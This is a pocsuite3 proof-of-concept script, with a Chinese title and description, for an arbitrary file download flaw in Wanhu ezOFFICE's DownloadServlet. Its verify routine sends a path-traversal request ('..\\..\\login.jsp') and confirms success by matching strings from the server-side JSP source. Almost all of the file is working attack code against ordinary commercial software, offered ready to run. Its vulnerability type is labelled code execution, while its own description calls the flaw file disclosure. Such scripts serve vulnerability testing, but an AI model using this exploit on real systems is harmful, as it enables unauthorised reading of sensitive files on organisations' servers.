from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '万户 ezOFFICE DownloadServlet 存在任意文件下载漏洞'
    appName = '万户 ezOFFICE'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''北京万户网络技术有限公司ezOFFICE DownloadServlet 存在任意文件下载漏洞，攻击者可利用该漏洞获取系统敏感信息。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0"
        }
        path = '/defaultroot/DownloadServlet?modeType=2&path=html&FileName=..\\..\\login.jsp&name=123&fiewviewdownload=2&cd=inline&downloadAll=2'
        vul_url = self.url+path
        resp = requests.get(url=vul_url, headers=headers, verify=False, allow_redirects=False, timeout=10)
        if resp.status_code == 200  and 'localeCode=request.getParameter' in resp.text and 'request.getParameter("logoindexpicaccName")' in resp.text:   
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url
            result['VerifyInfo']['Content'] = resp.text[:200]
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
